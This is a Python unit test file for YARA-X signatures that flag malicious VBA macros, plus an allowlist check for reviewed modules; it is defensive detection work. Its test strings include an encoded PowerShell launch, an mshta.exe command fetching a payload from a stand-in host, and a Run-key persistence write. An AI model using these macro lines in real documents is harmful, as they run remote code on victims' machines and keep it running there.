"""Exercise the malware signatures against representative VBA source."""

from pathlib import Path
import json
import sys
import unittest

import yara_x


RULES = Path(__file__).resolve().parents[2] / "tools" / "vba_malware.yar"
sys.path.insert(0, str(RULES.parent))
import security_scan  # noqa: E402


class YaraRuleTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = yara_x.compile(RULES.read_text(encoding="utf-8"))

    def matches(self, source: str) -> set[str]:
        return {rule.identifier for rule in self.rules.scan(source.encode()).matching_rules}

    def test_encoded_powershell(self):
        source = 'CreateObject("WScript.Shell").Run "powershell.exe -EncodedCommand ZgBvAG8="'
        self.assertIn("VBA_Encoded_PowerShell_Execution", self.matches(source))

    def test_remote_lolbin(self):
        source = 'Shell "mshta.exe https://evil.example/payload.hta"'
        self.assertIn("VBA_LOLBin_Remote_Execution", self.matches(source))

    def test_run_key_persistence(self):
        source = 'CreateObject("WScript.Shell").RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "x"'
        self.assertIn("VBA_Office_Run_Key_Persistence", self.matches(source))

    def test_regular_vba_does_not_match(self):
        self.assertEqual(set(), self.matches('Sub Build()\n  Debug.Print "ready"\nEnd Sub'))

    def test_documented_capability_is_accepted_by_module(self):
        expected = json.loads(security_scan.EXPECTED_PATH.read_text(encoding="utf-8"))
        module = security_scan.Module("ReDimUI", 'Application.Run "Build"', "test")
        security_scan.scan_yara(module, self.rules)
        security_scan.judge_yara(module, expected)
        self.assertIn("VBA_Dynamic_Invocation", module.yara_matches)
        self.assertTrue(module.yara_reasons["VBA_Dynamic_Invocation"])

    def test_same_capability_in_unreviewed_module_is_unexpected(self):
        expected = json.loads(security_scan.EXPECTED_PATH.read_text(encoding="utf-8"))
        module = security_scan.Module("Unreviewed", 'Application.Run "Build"', "test")
        security_scan.scan_yara(module, self.rules)
        security_scan.judge_yara(module, expected)
        self.assertIsNone(module.yara_reasons["VBA_Dynamic_Invocation"])


if __name__ == "__main__":
    unittest.main()
